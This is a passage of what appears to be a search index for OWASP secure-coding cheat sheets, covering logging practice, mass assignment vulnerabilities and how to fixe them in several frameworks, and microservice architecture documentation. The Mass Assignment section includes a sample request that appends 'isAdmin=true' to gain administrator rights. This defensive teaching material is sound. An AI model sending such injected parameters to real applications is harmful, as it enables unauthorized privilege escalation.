exclude"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#customizable-logging","text":"It may be desirable to be able to alter the level of logging (type of events based on severity or threat level, amount of detail recorded). If this is implemented, ensure that: The default level must provide sufficient detail for business needs It should not be possible to completely inactivate application logging or logging of events that are necessary for compliance requirements Alterations to the level/extent of logging must be intrinsic to the application (e.g. undertaken automatically by the application based on an approved algorithm) or follow change management processes (e.g. changes to configuration data, modification of source code) The logging level must be verified periodically","title":"Customizable logging"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#event-collection","text":"If your development framework supports suitable logging mechanisms use, or build upon that. Otherwise, implement an application-wide log handler which can be called from other modules/components. Document the interface referencing the organisation-specific event classification and description syntax requirements. If possible create this log handler as a standard module that can is thoroughly tested, deployed in multiple application, and added to a list of approved & recommended modules. Perform input validation on event data from other trust zones to ensure it is in the correct format (and consider alerting and not logging if there is an input validation failure) Perform sanitization on all event data to prevent log injection attacks e.g. carriage return (CR), line feed (LF) and delimiter characters (and optionally to remove sensitive data) Encode data correctly for the output (logged) format If writing to databases, read, understand and apply the SQL injection cheat sheet Ensure failures in the logging processes/systems do not prevent the application from otherwise running or allow information leakage Synchronize time across all servers and devices Note C Note C: This is not always possible where the application is running on a device under some other party's control (e.g. on an individual's mobile phone, on a remote customer's workstation which is on another corporate network). In these cases attempt to measure the time offset, or record a confidence level in the event timestamp. Where possible record data in a standard format, or at least ensure it can be exported/broadcast using an industry-standard format. In some cases, events may be relayed or collected together in intermediate points. In the latter some data may be aggregated or summarized before forwarding on to a central repository and analysis system.","title":"Event collection"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#verification","text":"Logging functionality and systems must be included in code review, application testing and security verification processes: Ensure the logging is working correctly and as specified Check events are being classified consistently and the field names, types and lengths are correctly defined to an agreed standard Ensure logging is implemented and enabled during application security, fuzz, penetration and performance testing Test the mechanisms are not susceptible to injection attacks Ensure there are no unwanted side-effects when logging occurs Check the effect on the logging mechanisms when external network connectivity is lost (if this is usually required) Ensure logging cannot be used to deplete system resources, for example by filling up disk space or exceeding database transaction log space, leading to denial of service Test the effect on the application of logging failures such as simulated database connectivity loss, lack of file system space, missing write permissions to the file system, and runtime errors in the logging module itself Verify access controls on the event log data If log data is utilized in any action against users (e.g. blocking access, account lock-out), ensure this cannot be used to cause denial of service (DoS) of other users","title":"Verification"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#deployment-and-operation","text":"","title":"Deployment and operation"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#release","text":"Provide security configuration information by adding details about the logging mechanisms to release documentation Brief the application/process owner about the application logging mechanisms Ensure the outputs of the monitoring (see below) are integrated with incident response processes","title":"Release"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#operation","text":"Enable processes to detect whether logging has stopped, and to identify tampering or unauthorized access and deletion (see protection below).","title":"Operation"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#protection","text":"The logging mechanisms and collected event data must be protected from mis-use such as tampering in transit, and unauthorized access, modification and deletion once stored. Logs may contain personal and other sensitive information, or the data may contain information regarding the application's code and logic. In addition, the collected information in the logs may itself have business value (to competitors, gossip-mongers, journalists and activists) such as allowing the estimate of revenues, or providing performance information about employees. This data may be held on end devices, at intermediate points, in centralized repositories and in archives and backups. Consider whether parts of the data may need to be excluded, masked, sanitized, hashed or encrypted during examination or extraction. At rest: Build in tamper detection so you know if a record has been modified or deleted Store or copy log data to read-only media as soon as possible All access to the logs must be recorded and monitored (and may need prior approval) The privileges to read log data should be restricted and reviewed periodically In transit: If log data is sent over untrusted networks (e.g. for collection, for dispatch elsewhere, for analysis, for reporting), use a secure transmission protocol Consider whether the origin of the event data needs to be verified Perform due diligence checks (regulatory and security) before sending event data to third parties See NIST SP 800-92 Guide to Computer Security Log Management for more guidance.","title":"Protection"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#monitoring-of-events","text":"The logged event data needs to be available to review and there are processes in place for appropriate monitoring, alerting and reporting: Incorporate the application logging into any existing log management systems/infrastructure e.g. centralized logging and analysis systems Ensure event information is available to appropriate teams Enable alerting and signal the responsible teams about more serious events immediately Share relevant event information with other detection systems, to related organizations and centralized intelligence gathering/sharing systems","title":"Monitoring of events"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#disposal-of-logs","text":"Log data, temporary debug logs, and backups/copies/extractions, must not be destroyed before the duration of the required data retention period, and must not be kept beyond this time. Legal, regulatory and contractual obligations may impact on these periods.","title":"Disposal of logs"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#related-articles","text":"OWASP ESAPI Documentation . OWASP Logging Project . IETF syslog protocol . Mitre Common Event Expression (CEE) (as of 2014 no longer actively developed). NIST SP 800-92 Guide to Computer Security Log Management . PCISSC PCI DSS v2.0 Requirement 10 and PA-DSS v2.0 Requirement 4 . W3C Extended Log File Format . Other Build Visibility In, Richard Bejtlich, TaoSecurity blog . Other Common Event Format (CEF), Arcsight . Other Log Event Extended Format ( LEEF ), IBM . Other Common Log File System (CLFS), Microsoft . Other Building Secure Applications: Consistent Logging, Rohit Sethi & Nish Bhalla, Symantec Connect .","title":"Related articles"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html","text":"Mass Assignment Cheat Sheet \u00b6 Introduction \u00b6 Definition \u00b6 Software frameworks sometime allow developers to automatically bind HTTP request parameters into program code variables or objects to make using that framework easier on developers. This can sometimes cause harm. Attackers can sometimes use this methodology to create new parameters that the developer never intended which in turn creates or overwrites new variable or objects in program code that was not intended. This is called a Mass Assignment vulnerability. Alternative Names \u00b6 Depending on the language/framework in question, this vulnerability can have several alternative names : Mass Assignment: Ruby on Rails, NodeJS. Autobinding: Spring MVC, ASP NET MVC. Object injection: PHP. Example \u00b6 Suppose there is a form for editing a user's account information: < form > < input name = \"userid\" type = \"text\" > < input name = \"password\" type = \"text\" > < input name = \"email\" text = \"text\" > < input type = \"submit\" > </ form > Here is the object that the form is binding to: public class User { private String userid ; private String password ; private String email ; private boolean isAdmin ; //Getters & Setters } Here is the controller handling the request: @RequestMapping ( value = \"/addUser\" , method = RequestMethod . POST ) public String submit ( User user ) { userService . add ( user ); return \"successPage\" ; } Here is the typical request: POST /addUser ... userid=bobbytables&password=hashedpass&email=bobby@tables.com And here is the exploit in which we set the value of the attribute isAdmin of the instance of the class User : POST /addUser ... userid=bobbytables&password=hashedpass&email=bobby@tables.com&isAdmin=true Exploitability \u00b6 This functionality becomes exploitable when: Attacker can guess common sensitive fields. Attacker has access to source code and can review the models for sensitive fields. AND the object with sensitive fields has an empty constructor. GitHub case study \u00b6 In 2012, GitHub was hacked using mass assignment. A user was able to upload his public key to any organization and thus make any subsequent changes in their repositories. GitHub's Blog Post . Solutions \u00b6 Whitelist the bindable, non-sensitive fields. Blacklist the non-bindable, sensitive fields. Use Data Transfer Objects (DTOs). General Solutions \u00b6 An architectural approach is to create Data Transfer Objects and avoid binding input directly to domain objects. Only the fields that are meant to be editable by the user are included in the DTO. public class UserRegistrationFormDTO { private String userid ; private String password ; private String email ; //NOTE: isAdmin field is not present //Getters & Setters } Language & Framework specific solutions \u00b6 Spring MVC \u00b6 Whitelisting \u00b6 @Controller public class UserController { @InitBinder public void initBinder ( WebDataBinder binder , WebRequest request ) { binder . setAllowedFields ( [ \"userid\" , \"password\" , \"email\" ] ); } ... } Take a look here for the documentation. Blacklisting \u00b6 @Controller public class UserController { @InitBinder public void initBinder ( WebDataBinder binder , WebRequest request ) { binder . setDisallowedFields ( [ \"isAdmin\" ] ); } ... } Take a look here for the documentation. NodeJS + Mongoose \u00b6 Whitelisting \u00b6 var UserSchema = new mongoose . Schema ({ userid : String , password : String , email : String , isAdmin : Boolean , }); UserSchema . statics = { User . userCreateSafeFields : [ 'userid' , 'password' , 'email' ] }; var User = mongoose . model ( 'User' , UserSchema ); _ = require ( 'underscore' ); var user = new User ( _ . pick ( req . body , User . userCreateSafeFields )); Take a look here for the documentation. Blacklisting \u00b6 var massAssign = require ( 'mongoose-mass-assign' ); var UserSchema = new mongoose . Schema ({ userid : String , password : String , email : String , isAdmin : { type : Boolean , protect : true , default : false } }); UserSchema . plugin ( massAssign ); var User = mongoose . model ( 'User' , UserSchema ); /** Static method, useful for creation **/ var user = User . massAssign ( req . body ); /** Instance method, useful for updating**/ var user = new User ; user . massAssign ( req . body ); /** Static massUpdate method **/ var input = { userid : 'bhelx' , isAdmin : 'true' }; User . update ({ '_id' : someId }, { $set : User . massUpdate ( input ) }, console . log ); Take a look here for the documentation. Ruby On Rails \u00b6 Take a look here for the documentation. Django \u00b6 Take a look here for the documentation. ASP NET \u00b6 Take a look here for the documentation. PHP Laravel + Eloquent \u00b6 Whitelisting \u00b6 <?php namespace App ; use Illuminate\\Database\\Eloquent\\Model ; class User extends Model { private $userid ; private $password ; private $email ; private $isAdmin ; protected $fillable = array ( 'userid' , 'password' , 'email' ); } Take a look here for the documentation. Blacklisting \u00b6 <?php namespace App ; use Illuminate\\Database\\Eloquent\\Model ; class User extends Model { private $userid ; private $password ; private $email ; private $isAdmin ; protected $guarded = array ( 'isAdmin' ); } Take a look here for the documentation. Grails \u00b6 Take a look here for the documentation. Play \u00b6 Take a look here for the documentation. Jackson (JSON Object Mapper) \u00b6 Take a look here and here for the documentation. GSON (JSON Object Mapper) \u00b6 Take a look here and here for the document. JSON-Lib (JSON Object Mapper) \u00b6 Take a look here for the documentation. Flexjson (JSON Object Mapper) \u00b6 Take a look here for the documentation. References and future reading \u00b6 Mass Assignment, Rails and You","title":"Mass Assignment"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#mass-assignment-cheat-sheet","text":"","title":"Mass Assignment Cheat Sheet"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#introduction","text":"","title":"Introduction"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#definition","text":"Software frameworks sometime allow developers to automatically bind HTTP request parameters into program code variables or objects to make using that framework easier on developers. This can sometimes cause harm. Attackers can sometimes use this methodology to create new parameters that the developer never intended which in turn creates or overwrites new variable or objects in program code that was not intended. This is called a Mass Assignment vulnerability.","title":"Definition"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#alternative-names","text":"Depending on the language/framework in question, this vulnerability can have several alternative names : Mass Assignment: Ruby on Rails, NodeJS. Autobinding: Spring MVC, ASP NET MVC. Object injection: PHP.","title":"Alternative Names"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#example","text":"Suppose there is a form for editing a user's account information: < form > < input name = \"userid\" type = \"text\" > < input name = \"password\" type = \"text\" > < input name = \"email\" text = \"text\" > < input type = \"submit\" > </ form > Here is the object that the form is binding to: public class User { private String userid ; private String password ; private String email ; private boolean isAdmin ; //Getters & Setters } Here is the controller handling the request: @RequestMapping ( value = \"/addUser\" , method = RequestMethod . POST ) public String submit ( User user ) { userService . add ( user ); return \"successPage\" ; } Here is the typical request: POST /addUser ... userid=bobbytables&password=hashedpass&email=bobby@tables.com And here is the exploit in which we set the value of the attribute isAdmin of the instance of the class User : POST /addUser ... userid=bobbytables&password=hashedpass&email=bobby@tables.com&isAdmin=true","title":"Example"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#exploitability","text":"This functionality becomes exploitable when: Attacker can guess common sensitive fields. Attacker has access to source code and can review the models for sensitive fields. AND the object with sensitive fields has an empty constructor.","title":"Exploitability"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#github-case-study","text":"In 2012, GitHub was hacked using mass assignment. A user was able to upload his public key to any organization and thus make any subsequent changes in their repositories. GitHub's Blog Post .","title":"GitHub case study"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#solutions","text":"Whitelist the bindable, non-sensitive fields. Blacklist the non-bindable, sensitive fields. Use Data Transfer Objects (DTOs).","title":"Solutions"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#general-solutions","text":"An architectural approach is to create Data Transfer Objects and avoid binding input directly to domain objects. Only the fields that are meant to be editable by the user are included in the DTO. public class UserRegistrationFormDTO { private String userid ; private String password ; private String email ; //NOTE: isAdmin field is not present //Getters & Setters }","title":"General Solutions"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#language-framework-specific-solutions","text":"","title":"Language &amp; Framework specific solutions"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#spring-mvc","text":"","title":"Spring MVC"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#whitelisting","text":"@Controller public class UserController { @InitBinder public void initBinder ( WebDataBinder binder , WebRequest request ) { binder . setAllowedFields ( [ \"userid\" , \"password\" , \"email\" ] ); } ... } Take a look here for the documentation.","title":"Whitelisting"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#blacklisting","text":"@Controller public class UserController { @InitBinder public void initBinder ( WebDataBinder binder , WebRequest request ) { binder . setDisallowedFields ( [ \"isAdmin\" ] ); } ... } Take a look here for the documentation.","title":"Blacklisting"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#nodejs-mongoose","text":"","title":"NodeJS + Mongoose"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#whitelisting_1","text":"var UserSchema = new mongoose . Schema ({ userid : String , password : String , email : String , isAdmin : Boolean , }); UserSchema . statics = { User . userCreateSafeFields : [ 'userid' , 'password' , 'email' ] }; var User = mongoose . model ( 'User' , UserSchema ); _ = require ( 'underscore' ); var user = new User ( _ . pick ( req . body , User . userCreateSafeFields )); Take a look here for the documentation.","title":"Whitelisting"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#blacklisting_1","text":"var massAssign = require ( 'mongoose-mass-assign' ); var UserSchema = new mongoose . Schema ({ userid : String , password : String , email : String , isAdmin : { type : Boolean , protect : true , default : false } }); UserSchema . plugin ( massAssign ); var User = mongoose . model ( 'User' , UserSchema ); /** Static method, useful for creation **/ var user = User . massAssign ( req . body ); /** Instance method, useful for updating**/ var user = new User ; user . massAssign ( req . body ); /** Static massUpdate method **/ var input = { userid : 'bhelx' , isAdmin : 'true' }; User . update ({ '_id' : someId }, { $set : User . massUpdate ( input ) }, console . log ); Take a look here for the documentation.","title":"Blacklisting"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#ruby-on-rails","text":"Take a look here for the documentation.","title":"Ruby On Rails"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#django","text":"Take a look here for the documentation.","title":"Django"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#asp-net","text":"Take a look here for the documentation.","title":"ASP NET"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#php-laravel-eloquent","text":"","title":"PHP Laravel + Eloquent"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#whitelisting_2","text":"<?php namespace App ; use Illuminate\\Database\\Eloquent\\Model ; class User extends Model { private $userid ; private $password ; private $email ; private $isAdmin ; protected $fillable = array ( 'userid' , 'password' , 'email' ); } Take a look here for the documentation.","title":"Whitelisting"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#blacklisting_2","text":"<?php namespace App ; use Illuminate\\Database\\Eloquent\\Model ; class User extends Model { private $userid ; private $password ; private $email ; private $isAdmin ; protected $guarded = array ( 'isAdmin' ); } Take a look here for the documentation.","title":"Blacklisting"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#grails","text":"Take a look here for the documentation.","title":"Grails"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#play","text":"Take a look here for the documentation.","title":"Play"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#jackson-json-object-mapper","text":"Take a look here and here for the documentation.","title":"Jackson (JSON Object Mapper)"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#gson-json-object-mapper","text":"Take a look here and here for the document.","title":"GSON (JSON Object Mapper)"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#json-lib-json-object-mapper","text":"Take a look here for the documentation.","title":"JSON-Lib (JSON Object Mapper)"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#flexjson-json-object-mapper","text":"Take a look here for the documentation.","title":"Flexjson (JSON Object Mapper)"},{"location":"cheatsheets/Mass_Assignment_Cheat_Sheet.html#references-and-future-reading","text":"Mass Assignment, Rails and You","title":"References and future reading"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html","text":"Microservices based Security Arch Doc Cheat Sheet \u00b6 Introduction \u00b6 The microservice architecture is being increasingly used for designing and implementing application systems in both cloud-based and on-premise infrastructures. There are many security challenges need to be addressed in the application design and implementation phases. In order to address some security challenges it is necessity to collect security-specific information on application architecture. The goal of this article is to provide a concrete proposal of approach to collect microservice-based architecture information to securing application. Context \u00b6 During securing applications based on microservices architecture, security architects/engineers usually face with the following questions (mostly referenced in the OWASP Application Security Verification Standard Project under the section V1 \"Architecture, Design and Threat Modeling Requirements\" ): Threat modeling and enforcement of the principle of least privilege: What scopes or API keys does microservice minimally need to access other microservice APIs? What grants does microservice minimally need to access database or message queue? Data leakage analysis: What storages or message queues do contain sensitive data? Does microservice read/write date from/to specific database or message queue? What microservices are invoked by dedicated microservice? What data is passed between microservices? Attack surface analysis: What microservices endpoints need to be tested during security testing? In most cases, existing application architecture documentation is not suitable to answer those questions. Next sections propose what architecture security-specific information can be collected to answer the questions above. Objective \u00b6 The objectives of the cheat sheet are to explain what architecture security-specific information can be collected to answer the questions above and provide concrete proposal of approach to collect microservice-based architecture information to securing application. Proposition \u00b6 Collect information on the building blocks \u00b6 Identify and describe application-functionality services \u00b6 Application-functionality services implement one or several business process or functionality (e.g., storing customer details, storing and displaying product catalog). Collect information on the parameters listed below related to each application-functionality service. Parameter name Description Service name (ID) Unique service name or ID Short description Short description of business process or functionality implemented by the microservice Link to source code repository Specify a link to service source code repository Development Team Specify development team which develops the microservice API definition If microservice exposes external interface specify a link to the interface description (e.g., OpenAPI specification). It is advisable to define used security scheme, e.g. define scopes or API keys needed to invoke dedicated endpoint (e.g., see ). The microservice architecture description Specify a link to the microservice architecture diagram, description (if available) Link to runbook Specify a link to the microservice runbook Identify and describe infrastructure services \u00b6 Infrastructure services including remote services may implement authentication, authorization, service registration and discovery, security monitoring, logging etc. Collect information on the parameters listed below related to each infrastructure service. Parameter name Description Service name (ID) Unique service name or ID Short description Short description of functionality implemented by the service (e.g., authentication, authorization, service registration and discovery, logging, security monitoring, API gateway). Link to source code repository Specify a link to service source code repository (if applicable) Link to the service documentation Specify a link to the service documentation that includes service API definition, operational guidance/runbook, etc. Identify and describe data storages \u00b6 Collect information on the parameters listed below related to each data storage. Parameter name Description Storage name (ID) Unique storage name or ID Software type Specify software that implements the data storage (e.g., PostgreSQL, Redis, Apache Cassandra). Identify and describe message queues \u00b6 Messaging systems (e.g., RabbitMQ or Apache Kafka) are used to implement asynchronous microservices communication mechanism. Collect information on the parameters listed below related to each message queue. Parameter name Description Message queue (ID) Unique message queue name or ID Software type Specify software that implements the message queue (e.g., RabbitMQ, Apache Kafka). Identify and describe data assets \u00b6 Identify and describe data assets that processed by system microservices/services. It is advisable firstly to identify assets, which are valuable from a security perspective (e.g., \"User information\", \"Payment\"). Collect information on the parameters listed below related to each asset. Parameter name Description Asset name (ID) Unique asset name or ID Protection level Specify asset protection level (e.g., PII, confidential) Additional info Add clarifying information Collect information on relations between building blocks \u00b6 Identify \"service-to-storage\" relations \u00b6 Collect information on the parameters listed below related to each \"service-to-storage\" relation. Parameter name Description Service name (ID) Specify service name (ID) defined above Storage name (ID) Specify storage name (ID) defined above Access type Specify access type, e.g. \"Read\" or \"Read/Write\" Identify \"service-to-service\" synchronous communications \u00b6 Collect information on the parameters listed below related to each \"service-to-service\" synchronous communication. Parameter name Description Caller service name (ID) Specify caller service name (ID) defined above Called service name (ID) Specify called service name (ID) defined above Protocol/framework used Specify protocol/framework used for communication, e.g. HTTP (REST, SOAP), Apache Thrift, gRPC Short description Shortly describe the purpose of communication (requests for query of information or request/commands for a state-changing business function) and data passed between services (if possible, in therms of assets defined above) Identify \"service-to-service\" asynchronous communications \u00b6 Collect information on the parameters listed below related to each \"service-to-service\" asynchronous communication. Parameter name Description Publisher service name (ID) Specify publisher service name (ID) defined above Subscriber service name (ID) Specify subscriber service name (ID) defined above Message queue (ID) Specify message queue (ID) defined above Short description Shortly describe the purpose of communication (receiving of information or commands for a state-changing business function) and data passed between services (if possible, in therms of assets defined above) Identify \"asset-to-storage\" relations \u00b6 Collect information on the parameters listed below related to each \"asset-to-storage\" relation. Parameter name Description Asset name (ID) Asset name (ID) defined above Storage name (ID) Specify storage name (ID) defined above Storage type Specify storage type for the asset, e.g. \"golden source\" or \"cache\" Create a graphical presentation of application architecture \u00b6 It is advisable to create graphical presentation of application architecture (building blocks and relations defined above) in form of services call graph or data flow diagram. In order to do that one can use special software tools (e.g. Enterprise Architect) or DOT language . See example of using DOT language here . Use collected information in secure software development practices \u00b6 Collected information may be useful for doing application security practices, e.g. during defining security requirements, threat modeling or security testing. Sections below contains examples of activities related to securing application architecture (as well as its mapping to OWASP projects) and tips for their implementation using information collected above. Attack surface analysis \u00b6 Implementation tips \u00b6 To enumerate microservices endpoints that need to be tested during security testing and analyzed during threat modeling analyze data collected under the following sections: Identify and describe application-functionality services (parameter \"API definition\") Identify and describe infrastructure services (parameter \"Link to the service documentation\") Mapping to OWASP projects \u00b6 OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.1.2 OWASP Attack Surface Analysis Cheat Sheet Data leakage analysis \u00b6 Implementation tips \u00b6 To analyze possible data leakage analyze data collected under the following sections: Identify and describe data assets Identify \"service-to-storage\" relations Identify \"service-to-service\" synchronous communications Identify \"service-to-service\" asynchronous communications Identify \"asset-to-storage\" relations Mapping to OWASP projects \u00b6 OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.1.2 OWASP Top 10-2017 A3-Sensitive Data Exposure Application's trust boundaries, components, and significant data flows justification \u00b6 Implementation tips \u00b6 To verify documentation and justification of all the application's trust boundaries, components, and significant data flows analyze data collected under the following sections: Identify and describe application-functionality services Identify and describe infrastructure services Identify and describe data storages Identify and describe message queues Identify \"service-to-storage\" relations Identify \"service-to-service\" synchronous communications Identify \"service-to-service\" asynchronous communications Mapping to OWASP projects \u00b6 OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.1.4 Analysis of the application's high-level architecture \u00b6 Implementation tips \u00b6 To verify definition and security analysis of the application's high-level architecture and all connected remote services analyze data collected under the following sections: Identify and describe application-functionality services Identify and describe infrastructure services Identify and describe data storages Identify and describe message queues Mapping to OWASP projects \u00b6 OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.1.5 Implementation of centralized security controls verification \u00b6 Implementation tips \u00b6 To verify implementation of centralized, simple (economy of design), vetted, secure, and reusable security controls to avoid duplicate, missing, ineffective, or insecure controls analyze data collected under the section \"Identify and describe infrastructure services\". Mapping to OWASP projects \u00b6 OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.1.6 Enforcement of the principle of least privilege \u00b6 Implementation tips \u00b6 To define minimally needed microservice permissions analyze data collected under the following sections: Identify and describe application-functionality services (parameter \"API definition\") Identify \"service-to-storage\" relations Identify \"service-to-service\" synchronous communications Identify \"service-to-service\" asynchronous communications Mapping to OWASP projects \u00b6 OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.4.3 Sensitive data identification and classification \u00b6 Implementation tips \u00b6 To verify that all sensitive data is identified and classified into protection levels analyze data collected under the following sections: Identify and describe data assets Identify \"asset-to-storage\" relations Mapping to OWASP projects \u00b6 OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.8.1 Application components business/security functions verification \u00b6 Implementation tips \u00b6 To verify the definition and documentation of all application components in terms of the business or security functions they provide analyze data collected under the following sections (parameter \"Short description\"): Identify and describe application-functionality services Identify and describe infrastructure services Mapping to OWASP projects \u00b6 OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.11.1","title":"Microservices based Security Arch Doc"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#microservices-based-security-arch-doc-cheat-sheet","text":"","title":"Microservices based Security Arch Doc Cheat Sheet"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#introduction","text":"The microservice architecture is being increasingly used for designing and implementing application systems in both cloud-based and on-premise infrastructures. There are many security challenges need to be addressed in the application design and implementation phases. In order to address some security challenges it is necessity to collect security-specific information on application architecture. The goal of this article is to provide a concrete proposal of approach to collect microservice-based architecture information to securing application.","title":"Introduction"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#context","text":"During securing applications based on microservices architecture, security architects/engineers usually face with the following questions (mostly referenced in the OWASP Application Security Verification Standard Project under the section V1 \"Architecture, Design and Threat Modeling Requirements\" ): Threat modeling and enforcement of the principle of least privilege: What scopes or API keys does microservice minimally need to access other microservice APIs? What grants does microservice minimally need to access database or message queue? Data leakage analysis: What storages or message queues do contain sensitive data? Does microservice read/write date from/to specific database or message queue? What microservices are invoked by dedicated microservice? What data is passed between microservices? Attack surface analysis: What microservices endpoints need to be tested during security testing? In most cases, existing application architecture documentation is not suitable to answer those questions. Next sections propose what architecture security-specific information can be collected to answer the questions above.","title":"Context"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#objective","text":"The objectives of the cheat sheet are to explain what architecture security-specific information can be collected to answer the questions above and provide concrete proposal of approach to collect microservice-based architecture information to securing application.","title":"Objective"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#proposition","text":"","title":"Proposition"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#collect-information-on-the-building-blocks","text":"","title":"Collect information on the building blocks"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#identify-and-describe-application-functionality-services","text":"Application-functionality services implement one or several business process or functionality (e.g., storing customer details, storing and displaying product catalog). Collect information on the parameters listed below related to each application-functionality service. Parameter name Description Service name (ID) Unique service name or ID Short description Short description of business process or functionality implemented by the microservice Link to source code repository Specify a link to service source code repository Development Team Specify development team which develops the microservice API definition If microservice exposes external interface specify a link to the interface description (e.g., OpenAPI specification). It is advisable to define used security scheme, e.g. define scopes or API keys needed to invoke dedicated endpoint (e.g., see ). The microservice architecture description Specify a link to the microservice architecture diagram, description (if available) Link to runbook Specify a link to the microservice runbook","title":"Identify and describe application-functionality services"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#identify-and-describe-infrastructure-services","text":"Infrastructure services including remote services may implement authentication, authorization, service registration and discovery, security monitoring, logging etc. Collect information on the parameters listed below related to each infrastructure service. Parameter name Description Service name (ID) Unique service name or ID Short description Short description of functionality implemented by the service (e.g., authentication, authorization, service registration and discovery, logging, security monitoring, API gateway). Link to source code repository Specify a link to service source code repository (if applicable) Link to the service documentation Specify a link to the service documentation that includes service API definition, operational guidance/runbook, etc.","title":"Identify and describe infrastructure services"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#identify-and-describe-data-storages","text":"Collect information on the parameters listed below related to each data storage. Parameter name Description Storage name (ID) Unique storage name or ID Software type Specify software that implements the data storage (e.g., PostgreSQL, Redis, Apache Cassandra).","title":"Identify and describe data storages"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#identify-and-describe-message-queues","text":"Messaging systems (e.g., RabbitMQ or Apache Kafka) are used to implement asynchronous microservices communication mechanism. Collect information on the parameters listed below related to each message queue. Parameter name Description Message queue (ID) Unique message queue name or ID Software type Specify software that implements the message queue (e.g., RabbitMQ, Apache Kafka).","title":"Identify and describe message queues"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#identify-and-describe-data-assets","text":"Identify and describe data assets that processed by system microservices/services. It is advisable firstly to identify assets, which are valuable from a security perspective (e.g., \"User information\", \"Payment\"). Collect information on the parameters listed below related to each asset. Parameter name Description Asset name (ID) Unique asset name or ID Protection level Specify asset protection level (e.g., PII, confidential) Additional info Add clarifying information","title":"Identify and describe data assets"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#collect-information-on-relations-between-building-blocks","text":"","title":"Collect information on relations between building blocks"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#identify-service-to-storage-relations","text":"Collect information on the parameters listed below related to each \"service-to-storage\" relation. Parameter name Description Service name (ID) Specify service name (ID) defined above Storage name (ID) Specify storage name (ID) defined above Access type Specify access type, e.g. \"Read\" or \"Read/Write\"","title":"Identify \"service-to-storage\" relations"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#identify-service-to-service-synchronous-communications","text":"Collect information on the parameters listed below related to each \"service-to-service\" synchronous communication. Parameter name Description Caller service name (ID) Specify caller service name (ID) defined above Called service name (ID) Specify called service name (ID) defined above Protocol/framework used Specify protocol/framework used for communication, e.g. HTTP (REST, SOAP), Apache Thrift, gRPC Short description Shortly describe the purpose of communication (requests for query of information or request/commands for a state-changing business function) and data passed between services (if possible, in therms of assets defined above)","title":"Identify \"service-to-service\" synchronous communications"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#identify-service-to-service-asynchronous-communications","text":"Collect information on the parameters listed below related to each \"service-to-service\" asynchronous communication. Parameter name Description Publisher service name (ID) Specify publisher service name (ID) defined above Subscriber service name (ID) Specify subscriber service name (ID) defined above Message queue (ID) Specify message queue (ID) defined above Short description Shortly describe the purpose of communication (receiving of information or commands for a state-changing business function) and data passed between services (if possible, in therms of assets 